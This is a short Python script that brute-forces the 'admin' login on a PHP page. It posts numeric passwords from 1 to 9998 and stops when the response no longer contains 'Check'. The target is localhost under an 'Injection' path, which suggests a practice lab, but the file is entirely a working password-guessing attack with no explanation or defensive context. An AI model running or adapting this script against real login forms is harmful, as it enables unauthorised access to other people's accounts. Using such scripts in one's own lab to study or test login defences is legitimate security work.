import requests

url = "http://127.0.0.1/Injection/index.php"

s = requests.Session()

for i in range(1,9999):
	response = s.post(url, data={"username":'admin', "password": i}).text
	if "Check" not in response:
		print ("password "+str(i));
		print(response)
		break
	else:
		print("Trying "+str(i)+"...")